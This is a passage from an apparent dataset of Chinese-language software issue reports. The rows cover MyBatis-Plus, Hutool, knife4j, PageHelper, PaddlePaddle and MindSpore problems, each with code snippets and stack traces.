~[junit-4.12.jar:4.12] at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) ~[junit-4.12.jar:4.12] at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) ~[junit-4.12.jar:4.12] at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61) ~[spring-test-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:27) ~[junit-4.12.jar:4.12] at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:70) ~[spring-test-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.junit.runners.ParentRunner.run(ParentRunner.java:363) ~[junit-4.12.jar:4.12] at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:190) ~[spring-test-5.0.9.RELEASE.jar:5.0.9.RELEASE] at org.junit.runner.JUnitCore.run(JUnitCore.java:137) ~[junit-4.12.jar:4.12] at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:69) ~[junit-rt.jar:na] at com.intellij.rt.junit.IdeaTestRunner$Repeater$1.execute(IdeaTestRunner.java:38) ~[junit-rt.jar:na] at com.intellij.rt.execution.junit.TestsRepeater.repeat(TestsRepeater.java:11) ~[idea_rt.jar:na] at com.intellij.rt.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:35) ~[junit-rt.jar:na] at com.intellij.rt.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:235) ~[junit-rt.jar:na] at com.intellij.rt.junit.JUnitStarter.main(JUnitStarter.java:54) ~[junit-rt.jar:na]"
网络字典url参数能根据column属性值动态配置？,"网络字典url参数能根据column属性值动态配置？ url能动{{id}}态获取列属性值吗？   <code>: column: [{ width: 150, label: '编号', prop: 'clientId', align: 'center', sortable: true, rules: [{ required: true, message: '请输入clientId', trigger: 'blur' }] }, { width: 150, label: '类型', prop: 'type', align: 'center', sortable: true, dicUrl: '/api/dic/{{id}}/list' rules: [{ required: true, message: '请输入clientId', trigger: 'blur' }] } ]"
添加SpringSecurity登录接口到knife4j中,"有些场景我们需要手动将接口添加到knife4j中，SpringSecurity的用户名密码登录接口，无法通过这种注解方式生成api接口文档。这个时候如何将登录接口添加到knife4j中？ 比如：在requestBody使用JSON传参 这样只会显示   <code>: @Component public class OwnSwaggerAddtion implements ApiListingScannerPlugin { /** * 实现此方法可手动添加ApiDescriptions */ @Override public List&lt;ApiDescription&gt; apply(DocumentationContext context) { Operation usernamePasswordOperation = new OperationBuilder(new CachingOperationNameGenerator()) .method(HttpMethod.POST) .summary(""用户名密码登录"") .notes(""用户登陆获取token"") .consumes(Sets.newHashSet(MediaType.APPLICATION_JSON_VALUE)) .produces(Sets.newHashSet(MediaType.APPLICATION_JSON_VALUE)) .build(); ApiDescription loginApiDescription = new ApiDescription(""login"", ""/login"", ""登录接口"", ""描述"", Arrays.asList(usernamePasswordOperation), false); return Arrays.asList(loginApiDescription); } /** * 是否使用此插件 * * @param documentationType swagger文档类型 * @return true 启用 */ @Override public boolean supports(DocumentationType documentationType) { return DocumentationType.OAS_30.equals(documentationType); } }"
Oracle中，如何写查询时间范围语句,"当前使用版本 3.0.6 Oracle 11G中，字段设置为timestamp，此时，传入的字符串时间必须使用Oracle的to_date函数进行格式化才能进行查询，查询语句如下 尝试使用Mybatis-plus的QueryWrapper进行条件查询 Could not set parameters for mapping: ParameterMapping{property='ew.paramNameValuePairs.MPGENVAL3', mode=IN, javaType=class java.lang.Object, jdbcType=null, numericScale=null, resultMapId='null', jdbcTypeName='null', expression='null'}. Cause: org.apache.ibatis.type.TypeException: Error setting non null for parameter #1:idworker类的作用是什么 with JdbcType null . Try setting a different JdbcType for this parameter or a different configuration property. Cause: org.apache.ibatis.type.TypeException: Error setting non null for parameter #1:idworker类的作用是什么 with JdbcType null . Try setting a different JdbcType for this parameter or a different configuration property. Cause: java.sql.SQLException: 无效的列索引 补充： 这里的关键是我用的参数绑定的写法，如果我放弃参数绑定的写法，直接传入sql，如下所示 查询能通过。如果想用参数绑定的方式，这里就会这样   <code>: SELECT * FROM PROJ_TEACH_RESEARCH_SETUP WHERE PROJ_CREATE_TIME &gt;= TO_DATE('2018-12-26 15:03:33','yyyy-MM-dd HH24:MI:SS') projTeachResearchSetupMapper.selectList(new QueryWrapper&lt;ProjTeachResearchSetup&gt;().apply(""PROJ_CREATE_TIME = TO_DATE('{0}','yyyy-MM-dd HH24:MI:SS')"", ""2018-12-26 15:03:33"")); projTeachResearchSetupMapper.selectList(new QueryWrapper&lt;ProjTeachResearchSetup&gt;().apply(""PROJ_CREATE_TIME = TO_DATE('2018-12-26 15:03:33','yyyy-MM-dd HH24:MI:SS')""));"
使用 DataPermissionInterceptor 数据权限插件在分页场景统计总数量错误（数据不正确）,当前使用版本 使用 DataPermissionInterceptor 插件设置数据查询条件（数据范围），在分页的场景分页插件 PaginationInnerInterceptor 有一个查询统计数量的语句，这个语句得到的结果不正确（没有使用到DataPermissionInterceptor插件设置的条件），但是实际的查询数据中有DataPermissionInterceptor插件设置的查询条件 用了DataPermissionInterceptor插件后，在定义的DataPermissionHandler中返回一个新的（涵盖以前的条件）条件信息。 业务Service继承IService，业务Mapper继承BaseMapper，直接使用 Service..lambdaQuery().page(page); 获取分页数据，在控制台中，第一条统计数量的SQL无任何DataPermissionHandler定义的查询条件，在第二条查询数据的SQL有DataPermissionHandler定义的查询条件 无任何报错，就是得到的分页数量信息不正确 https://github.com/baomidou/mybatis-plus/issues/3668   <code>: com.baomidou:mybatis-plus-boot-starter:3.4.3.1
cache在put的时候，没有判断value是否为null，会一直往cache里面存入null。,"JDK版本： jdk 1.8.0_261 hutool版本： v5-dev 工程：hutool.cache 类全路径：cn.hutool.cache.impl.AbstractCache 方法：get(K, boolean, cn.hutool.core.lang.func.Func0) 问题：   <code>: Cache&lt;String, ConfigPO&gt; CONF_CACHE = new FIFOCache&lt;&gt;(10); CONF_CACHE.put(""A"", ConfigPO.builder().id(1).build()); CONF_CACHE.put(""B"", ConfigPO.builder().id(2).build()); ConfigPO configC = BACKUP_CONF_CACHE.get(""C"", () -&gt; null); ConfigPO configD = BACKUP_CONF_CACHE.get(""D"", () -&gt; null); System.err.println(BACKUP_CONF_CACHE.size());// 结果为：4"
MTCNN模型的交叉熵损失函数,"PaddlePaddle Ubuntu 16.04 Python 3.5 问题 我想用PaddlePaddle复现MTCNN模型的交叉熵损失函数，以下的tensorflow的代码 我用PaddlePaddle大概复现了一下，逻辑也不知道对不对的。 在使用的时候报错： 恳请各位老师帮忙复现一下，谢谢。   <code>: def cls_ohem(cls_prob, label): '''计算类别损失 参数： cls_prob：预测类别，是否有人 label：真实值 返回值： 损失 ''' zeros = tf.zeros_like(label) # 只把pos的label设定为1,其余都为0 label_filter_invalid = tf.where(tf.less(label, 0), zeros, label) # 类别size[2*batch] num_cls_prob = tf.size(cls_prob) cls_prob_reshpae = tf.reshape(cls_prob, [num_cls_prob, -1]) label_int = tf.cast(label_filter_invalid, tf.int32) # 获取batch数 num_row = tf.to_int32(cls_prob.get_shape()[0]) # 对应某一batch而言，batch*2为非人类别概率，batch*2+1为人概率类别,indices为对应 cls_prob_reshpae # 应该的真实值，后续用交叉熵计算损失 row = tf.range(num_row) * 2 indices_ = row + label_int # 真实标签对应的概率 label_prob = tf.squeeze(tf.gather(cls_prob_reshpae, indices_)) loss = -tf.log(label_prob + 1e-10) zeros = tf.zeros_like(label_prob, dtype=tf.float32) ones = tf.ones_like(label_prob, dtype=tf.float32) # 统计neg和pos的数量 valid_inds = tf.where(label &lt; zeros, zeros, ones) num_valid = tf.reduce_sum(valid_inds) # 选取70%的数据 keep_num = tf.cast(num_valid * num_keep_radio, dtype=tf.int32) # 只选取neg，pos的70%损失 loss = loss * valid_inds loss, _ = tf.nn.top_k(loss, k=keep_num) return tf.reduce_mean(loss) def cls_ohem(cls_prob, label): '''计算类别损失 参数： cls_prob：预测类别，是否有人 label：真实值 返回值： 损失 ''' # 只把pos的label设定为1,其余都为0 zeros = fluid.layers.zeros(shape=[int(i) for i in label.shape], dtype=label.dtype) cond = fluid.layers.less_than(x=label, y=fluid.layers.fill_constant(shape=[],dtype='float32', value=0)) ie = fluid.layers.IfElse(cond) with ie.true_block(): ie.output(zeros) with ie.false_block(): ie.output(label) label_filter_invalid = ie() # 类别size[2*batch] num_cls_prob = sum(cls_prob.shape) cls_prob_reshpae = fluid.layers.reshape(cls_prob, [num_cls_prob, -1]) label_int = fluid.layers.cast(label_filter_invalid[0], dtype='int32') # 获取batch数 num_row = fluid.layers.fill_constant(shape=[],dtype='int32', value=cls_prob.shape[0]) # 对应某一batch而言，batch*2为非人类别概率，batch*2+1为人概率类别,indices为对应 cls_prob_reshpae # 应该的真实值，后续用交叉熵计算损失 indices_ = [] i = fluid.layers.fill_constant(shape=[], dtype='int32', value=0) cond = fluid.layers.less_than(x=i, y=num_row) print(cond) while_op = fluid.layers.While(cond=cond) with while_op.block(): indices_.append(i + label_int) i = i + 1 fluid.layers.less_than(x=i, y=num_row, cond=cond) # 真实标签对应的概率 indices_ = fluid.layers.cast(indices_, dtype='int32') label_prob = fluid.layers.squeeze(fluid.layers.gather(cls_prob_reshpae, indices_)) loss = -fluid.layers.log(label_prob + 1e-10) zeros = fluid.layers.zeros(shape=[int(i) for i in label_prob.shape], dtype='float32') ones = fluid.layers.ones(shape=[int(i) for i in label_prob.shape], dtype='float32') # 统计neg和pos的数量 cond2 = fluid.layers.less_than(x=label, y=zeros) ie2 = fluid.layers.IfElse(cond2) with ie2.true_block(): ie2.output(zeros) with ie2.false_block(): ie2.output(ones) valid_inds = ie2() num_valid = fluid.layers.reduce_sum(valid_inds) # 选取70%的数据 keep_num = fluid.layers.cast(num_valid * num_keep_radio, dtype='int32') # 只选取neg，pos的70%损失 loss = loss * valid_inds loss, _ = fluid.layers.nn.topk(loss, k=keep_num) return fluid.layers.reduce_mean(loss) Traceback (most recent call last): File ""/media/test/5C283BCA283BA1C6/yeyupiaoling/PyCharm/PaddlePaddle-MTCNN/train_PNet/train_PNet.py"", line 12, in &lt;module&gt; image, label, bbox_target, landmark_target, label_cost, bbox_loss, landmark_loss, conv4_1, conv4_2, conv4_3 = P_Net() File ""/media/test/5C283BCA283BA1C6/yeyupiaoling/PyCharm/PaddlePaddle-MTCNN/train_PNet/model.py"", line 67, in P_Net label_cost = cls_ohem(cls_prob=cls_prob, label=label) File ""/media/test/5C283BCA283BA1C6/yeyupiaoling/PyCharm/PaddlePaddle-MTCNN/train_PNet/model.py"", line 114, in cls_ohem while_op = fluid.layers.While(cond=cond) File ""/usr/local/lib/python3.5/dist-packages/paddle/fluid/layers/control_flow.py"", line 693, in __init__ raise TypeError(""condition should be a bool scalar"") TypeError: condition should be a bool scalar"
[CT][MS][generate]test_ctrl25 second grad fail,"25号随机组网，控制流+二阶求导，报错 / 硬件环境: /device ascend /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph python test_ctrl25.py pass [CRITICAL] RUNTIME_FRAMEWORK(44125,7f6ff2de7740,python):2022-04-14-15:21:44.854.120 [mindspore/ccsrc/runtime/graph_scheduler/control_node_parser.cc:1376] ParseFormalToRealParameter] Invalid funcgraph node:ValueNode PolyNode for partial node:7362_6881_6414_5382_2494_1880_↓???construct.4380:[CNode]4381{[0]: ValueNode Partial, [1]: ValueNode PolyNode, [2]: [CNode]4382} ms forward: [8.] ms backward: (Tensor(shape=[1], dtype=Float32, value= [ 1.00000000e+00]), Tensor(shape=[1], dtype=Float32, value= [ 1.00000000e+00])) Traceback (most recent call last): File ""test_ctrl25.py"", line 133, in sgrad = sgrad_net(Tensor(x), Tensor(y)) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 447, in staging_specialize out = _MindsporeFunctionExecutor(func, ms_create_time, input_signature, process_obj)(*args) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 90, in wrapper results = fn(*arg, **kwargs) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 358, in call phase = self.compile(args_list, self.fn.name) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 326, in compile is_compile = self._graph_executor.compile(self.fn, args_list, phase, True) RuntimeError: mindspore/ccsrc/runtime/graph_scheduler/control_node_parser.cc:1376 ParseFormalToRealParameter] Invalid funcgraph node:ValueNode PolyNode for partial node:7362_6881_6414_5382_2494_1880_↓???construct.4380:[CNode]4381{[0]: ValueNode Partial, [1]: ValueNode PolyNode, [2]: [CNode]4382}   <code>: from mindspore.nn import Cell, GraphCell from mindspore.common import Tensor, dtype import mindspore.ops.operations as P import mindspore.ops.functional as F import numpy as np class Net(Cell): def __init__(self): super().__init__() self.op = P.Add() def construct(self, x, y): for r in range(2): if (x == y): t = (y + 1) d = (y / 2) elif (5 == x): u = (2 / x) elif (x &lt;= 2): while (x &lt;= 4): g = (y * 3) if (2 &gt;= x): break elif (1 &gt;= x): f = (y / y) elif (y &gt;= x): c = (x - x) g = (1 - y) elif (x &gt;= y): l = (1 * y) elif (x &gt; y): h = (y / 1) else: m = (y + y) while (x &lt; y): g = (x + y) if (0 == x): q = (x * 3) elif (x &lt; 4): s = (1 - x) elif (x &lt; 0): j = (y + 1) else: e = (y / 2) b = (2 / x) if (x &gt;= y): pass if (y != x): g = (r * y) elif (x &gt;= 0): d = (1 - x) else: for d in range(2): t = (x * y) i = (x + d) if (y &gt;= x): pass if (x == 3): continue return self.op(x, y) x = np.array([4], np.float32) y = np.array([4], np.float32) net = Net() out = net(Tensor(x), Tensor(y)) print('ms forward: ', out) grad_net = F.grad(net, grad_position=(0, 1)) fgrad = grad_net(Tensor(x), Tensor(y)) print('ms backward: ', fgrad) sgrad_net = F.grad(grad_net) sgrad = sgrad_net(Tensor(x), Tensor(y)) print('second grad: ', sgrad)"
非对称加密,"JDK版本： openjdk_8_201 hutool版本： 5.4.6 BadPaddingException: Decryption error cn.hutool.crypto.CryptoException: BadPaddingException: Decryption error at cn.hutool.crypto.asymmetric.AsymmetricCrypto.decrypt(AsymmetricCrypto.java:282) at cn.hutool.crypto.asymmetric.RSA.decrypt(RSA.java:173) at cn.hutool.crypto.asymmetric.AbstractAsymmetricCrypto.decrypt(AbstractAsymmetricCrypto.java:255) at cn.hutool.crypto.asymmetric.AbstractAsymmetricCrypto.decryptStr(AbstractAsymmetricCrypto.java:268) at cn.hutool.crypto.asymmetric.AbstractAsymmetricCrypto.decryptStr(AbstractAsymmetricCrypto.java:280) at test.Test2.test5(Test2.java:92) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.junit.runner.JUnitCore.run(JUnitCore.java:137) at org.junit.runner.JUnitCore.run(JUnitCore.java:115) at org.junit.vintage.engine.execution.RunnerExecutor.execute(RunnerExecutor.java:40) at java.util.stream.ForEachOps$ForEachOp$OfRef.accept(ForEachOps.java:184) at java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:193) at java.util.Iterator.forEachRemaining(Iterator.java:116) at java.util.Spliterators$IteratorSpliterator.forEachRemaining(Spliterators.java:1801) at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:482) at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:472) at java.util.stream.ForEachOps$ForEachOp.evaluateSequential(ForEachOps.java:151) at java.util.stream.ForEachOps$ForEachOp$OfRef.evaluateSequential(ForEachOps.java:174) at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) at java.util.stream.ReferencePipeline.forEach(ReferencePipeline.java:418) at org.junit.vintage.engine.VintageTestEngine.executeAllChildren(VintageTestEngine.java:80) at org.junit.vintage.engine.VintageTestEngine.execute(VintageTestEngine.java:71) at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:108) at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:88) at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:54) at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:67) at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:52) at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:96) at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:75) at org.gradle.api.internal.tasks.testing.junitplatform.JUnitPlatformTestClassProcessor$CollectAllTestClassesExecutor.processAllTestClasses(JUnitPlatformTestClassProcessor.java:99) at org.gradle.api.internal.tasks.testing.junitplatform.JUnitPlatformTestClassProcessor$CollectAllTestClassesExecutor.access$000(JUnitPlatformTestClassProcessor.java:79) at org.gradle.api.internal.tasks.testing.junitplatform.JUnitPlatformTestClassProcessor.stop(JUnitPlatformTestClassProcessor.java:75) at org.gradle.api.internal.tasks.testing.SuiteTestClassProcessor.stop(SuiteTestClassProcessor.java:61) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.gradle.internal.dispatch.ReflectionDispatch.dispatch(ReflectionDispatch.java:36) at org.gradle.internal.dispatch.ReflectionDispatch.dispatch(ReflectionDispatch.java:24) at org.gradle.internal.dispatch.ContextClassLoaderDispatch.dispatch(ContextClassLoaderDispatch.java:33) at org.gradle.internal.dispatch.ProxyDispatchAdapter$DispatchingInvocationHandler.invoke(ProxyDispatchAdapter.java:94) at com.sun.proxy.$Proxy2.stop(Unknown Source) at org.gradle.api.internal.tasks.testing.worker.TestWorker.stop(TestWorker.java:135) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.gradle.internal.dispatch.ReflectionDispatch.dispatch(ReflectionDispatch.java:36) at org.gradle.internal.dispatch.ReflectionDispatch.dispatch(ReflectionDispatch.java:24) at org.gradle.internal.remote.internal.hub.MessageHubBackedObjectConnection$DispatchWrapper.dispatch(MessageHubBackedObjectConnection.java:182) at org.gradle.internal.remote.internal.hub.MessageHubBackedObjectConnection$DispatchWrapper.dispatch(MessageHubBackedObjectConnection.java:164) at org.gradle.internal.remote.internal.hub.MessageHub$Handler.run(MessageHub.java:414) at org.gradle.internal.concurrent.ExecutorPolicy$CatchAndRecordFailures.onExecute(ExecutorPolicy.java:64) at org.gradle.internal.concurrent.ManagedExecutorImpl$1.run(ManagedExecutorImpl.java:48) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.gradle.internal.concurrent.ThreadFactoryImpl$ManagedThreadRunnable.run(ThreadFactoryImpl.java:56) at java.lang.Thread.run(Thread.java:748) Caused by: javax.crypto.BadPaddingException: Decryption error at sun.security.rsa.RSAPadding.unpadV15(RSAPadding.java:379) at sun.security.rsa.RSAPadding.unpad(RSAPadding.java:290) at com.sun.crypto.provider.RSACipher.doFinal(RSACipher.java:365) at com.sun.crypto.provider.RSACipher.engineDoFinal(RSACipher.java:391) at javax.crypto.Cipher.doFinal(Cipher.java:2226) at cn.hutool.crypto.asymmetric.AsymmetricCrypto.doFinal(AsymmetricCrypto.java:325) at cn.hutool.crypto.asymmetric.AsymmetricCrypto.decrypt(AsymmetricCrypto.java:280) ... 73 more   <code>: byte[] aByte = HexUtil.decodeHex(a); byte[] decrypt = rsa.decrypt(aByte, KeyType.PrivateKey); String msg = StrUtil.str(decrypt, CharsetUtil.CHARSET_UTF_8); System.out.println(msg); String decodeHexStr = HexUtil.decodeHexStr(a); // 出错 System.out.println(rsa.decryptStr(decodeHexStr, KeyType.PrivateKey)); System.out.println(""-----------------------------------------"");"
在非WEB环境下使用此插件会报Error错误，导致应用无法使用,"考虑到某些原因，现在仍然存在非WEB容器下运行的程序。这种情况下，在配置完插件信息 之后，在运行程序时直接报Error： 经过一番查询，终于知道在代码com.github.pagehelper.SqlUtil类中 找到问题。 因为非WEB环境下，不存在javax.servlet.ServletRequest这个类，就导致Error报错。但是这里却没有catch到Error，导致整个不能使用。   <code>: &lt;property name=""plugins""&gt; &lt;array&gt; &lt;bean class=""com.github.pagehelper.PageHelper""&gt; &lt;property name=""properties""&gt; &lt;value&gt; dialect=oracle &lt;/value&gt; &lt;/property&gt; &lt;/bean&gt; &lt;/array&gt; &lt;/property&gt; org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.mybatis.spring.mapper.MapperScannerConfigurer#0' defined in class path resource [conf/applicationContext.xml]: Cannot resolve reference to bean 'sqlSessionFactory' while setting bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [conf/applicationContext.xml]: Cannot create inner bean 'com.github.pagehelper.PageHelper#78e8b38b' of type [com.github.pagehelper.PageHelper] while setting bean property 'plugins' with key [0]; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'com.github.pagehelper.PageHelper#78e8b38b' defined in class path resource [conf/applicationContext.xml]: Error setting property values; nested exception is org.springframework.beans.PropertyBatchUpdateException; nested PropertyAccessExceptions (1) are: PropertyAccessException 1: org.springframework.beans.MethodInvocationException: Property 'properties' threw exception; nested exception is java.lang.ClassFormatError: Absent Code attribute in method that is not native or abstract in class file javax/servlet/ServletInputStream at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveReference(BeanDefinitionValueResolver.java:336) at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveValueIfNecessary(BeanDefinitionValueResolver.java:108) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1457) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1198) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:537) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:475) at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:302) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:228) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:298) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:198) at org.springframework.context.support.PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(PostProcessorRegistrationDelegate.java:116) at org.springframework.context.support.AbstractApplicationContext.invokeBeanFactoryPostProcessors(AbstractApplicationContext.java:611) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:464) at org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:139) at org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:83) static { try { requestClass = Class.forName(""javax.servlet.ServletRequest""); getParameterMap = requestClass.getMethod(""getParameterMap"", new Class[]{}); hasRequest = true; } catch (Exception e) { hasRequest = false; } }"
NMT模型encode之后的向量输出,"尝试用seq2seq来获得文本的向量，参考的模型是教程的NMT模型，输出一条完整序列encoder之后的向量，怎么输出呢？   <code>: def seq_to_seq_net(source_dict_dim, target_dict_dim, args, max_length=32, beam_size = 3): ### Network Architecture word_vector_dim, encoder_size, \ decoder_size = map(int, args.dnn_size.split("","")) is_generating = args.is_generating #### Encoder src_word_id = paddle.layer.data( name='source_language_word', type=paddle.data_type.integer_value_sequence(source_dict_dim)) src_embedding = paddle.layer.embedding( input=src_word_id, size=word_vector_dim) src_forward = paddle.networks.simple_gru( input=src_embedding, size=encoder_size) src_backward = paddle.networks.simple_gru( input=src_embedding, size=encoder_size, reverse=True) encoded_vector = paddle.layer.concat(input=[src_forward, src_backward]) #### Decoder encoded_proj = paddle.layer.fc( act=paddle.activation.Linear(), size=decoder_size, bias_attr=False, input=encoded_vector) #是应该在这里打印source text向量吗 layers.print_layer(encoded_proj) backward_first = paddle.layer.first_seq(input=src_backward) decoder_boot = paddle.layer.fc( size=decoder_size, act=paddle.activation.Tanh(), bias_attr=False, input=backward_first) def gru_decoder_with_attention(enc_vec, enc_proj, current_word): decoder_mem = paddle.layer.memory( name='gru_decoder', size=decoder_size, boot_layer=decoder_boot) context = paddle.networks.simple_attention( encoded_sequence=enc_vec, encoded_proj=enc_proj, decoder_state=decoder_mem) decoder_inputs = paddle.layer.fc( act=paddle.activation.Linear(), size=decoder_size * 3, bias_attr=False, input=[context, current_word], layer_attr=paddle.attr.ExtraLayerAttribute( error_clipping_threshold=100.0)) gru_step = paddle.layer.gru_step( name='gru_decoder', input=decoder_inputs, output_mem=decoder_mem, size=decoder_size) out = paddle.layer.fc( size=target_dict_dim, bias_attr=True, act=paddle.activation.Softmax(), input=gru_step) return out decoder_group_name = 'decoder_group' group_input1 = paddle.layer.StaticInput(input=encoded_vector) group_input2 = paddle.layer.StaticInput(input=encoded_proj) group_inputs = [group_input1, group_input2] if not is_generating: trg_embedding = paddle.layer.embedding( input=paddle.layer.data( name='target_language_word', type=paddle.data_type.integer_value_sequence(target_dict_dim)), size=word_vector_dim, param_attr=paddle.attr.ParamAttr(name='_target_language_embedding')) group_inputs.append(trg_embedding) # For decoder equipped with attention mechanism, in training, # target embeding (the groudtruth) is the data input, # while encoded source sequence is accessed to as an unbounded memory. # Here, the StaticInput defines a read-only memory # for the recurrent_group. decoder = paddle.layer.recurrent_group( name=decoder_group_name, step=gru_decoder_with_attention, input=group_inputs) lbl = paddle.layer.data( name='target_language_next_word', type=paddle.data_type.integer_value_sequence(target_dict_dim)) cost = paddle.layer.classification_cost(input=decoder, label=lbl) return cost else: # In generation, the decoder predicts a next target word based on # the encoded source sequence and the previous generated target word. # The encoded source sequence (encoder's output) must be specified by # StaticInput, which is a read-only memory. # Embedding of the previous generated word is automatically retrieved # by GeneratedInputs initialized by a start mark &lt;s&gt;. trg_embedding = paddle.layer.GeneratedInput( size=target_dict_dim, embedding_name='_target_language_embedding', embedding_size=word_vector_dim) group_inputs.append(trg_embedding) beam_gen = paddle.layer.beam_search( name=decoder_group_name, step=gru_decoder_with_attention, input=group_inputs, bos_id=0, eos_id=1, beam_size=beam_size, max_length=max_length) return beam_gen"
[CT][MS][dilation2d] GPU平台 assertion error,"MindSpore输出的数据有一部分是0 一、VALID模式下 assertion error 举例： stride = 1，dilation = 1 -&gt; 参见用例1，input，filter 都没有改变 stride = 1，dilation = 2 二、SAME模式下 stride = 1情况下，dilation为1,2,3都 无问题 stride 不为1 ，会出现精度误差 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 基于用例1修改：   <code>: test_dilation2d.py:69: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/dilation2d_ops.py:138: in forward_cmp allclose_nparray(out_tensorflow, out_mindspore, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[3.872082 , 0.8327403 , 4.738534 , 